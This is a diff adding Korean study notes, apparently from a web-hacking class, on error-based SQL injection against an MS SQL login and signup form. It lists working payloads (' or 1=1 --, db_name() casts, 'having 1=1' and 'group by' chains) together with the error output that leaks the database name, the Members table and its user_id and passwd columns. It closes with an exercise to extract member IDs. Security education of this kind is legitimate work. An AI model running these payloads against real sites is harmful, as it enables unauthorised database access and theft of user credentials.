@@ -1,0 +1,71 @@
+SQL Injection을 SQLi로 표현한다.
+
+로그인 페이지에서
+하나씩
+아이디에 '
+비번에는 비밀번호에 쓰이는 문자열
+반대로도 체크
+서버측이기때문에 500번 오류
+
+'and 1=1 --
+했는데 관련없는 게시물들이 나오면 db로 넘어가서 결과를 도출한것이다.
+문자로 실행된것이아닌 연산자와 참이라고 인식해서 취약점이다.
+문자로 실행되면 취약점이 아니다.
+
+참에서는 제대로 실행되고 거짓일때 db에러가 나올수 있기때문에
+참이랑 거짓 둘 다 실행해봐야한다.
+
+url encoding reference
+w3schools.com
+
+ostermiller
+ostermiller.org
+
+디코딩이 매우 쉽기때문에 암호화로 사용하지 못한다.
+
+
+회원가입에 주소찾기에
+'or 1=1 --
+입력하면 모든 주소가 나타난다.
+취약점이 존재한다고 생각한다.
+
+'
+db 에러페이지
+
+
+db_name()
+-> 데이터베이스 이름 반환
+'and db_name() > 1--
+= nvarchar 값 'oyesmall'을(를) 데이터 형식 int(으)로 변환하지 못했습니다.
+= db이름은 oyesmall
+
+
+
+'having 1= 1 --
+이렇게하면 group by 없다고 에러가 나타날것이다.
+group by 뒤에 
+
+= 열 'Members.num'이(가) 집계 함수나 GROUP BY 절에 없으므로 SELECT 목록에서 사용할 수 없습니다.
+==> 테이블명 : Members
+==> 컬럼명 : num
+
+'group by (num) --
+= 열 'Members.user_id'이(가) 집계 함수나 GROUP BY 절에 없으므로 SELECT 목록에서 사용할 수 없습니다.
+==> 테이블명 : Members
+==> 컬럼명 : user_id
+
+
+'group by num, user_id --
+= 열 'Members.passwd'이(가) 집계 함수나 GROUP BY 절에 없으므로 SELECT 목록에서 사용할 수 없습니다.
+==> 테이블명 : Members
+==> 컬럼명 : passwd
+
+
+
+첫번째 아이디 노출 시키기
+'or 1 in(SELECT user_id FROM Members WHERE num > 0) --
+
+Q) 위와 같은 회원의 아이디를 에러페이지에 노출시키는 것을 응용하셔서 회원의 아이디 5개 뽑아보세요.
+
+
+
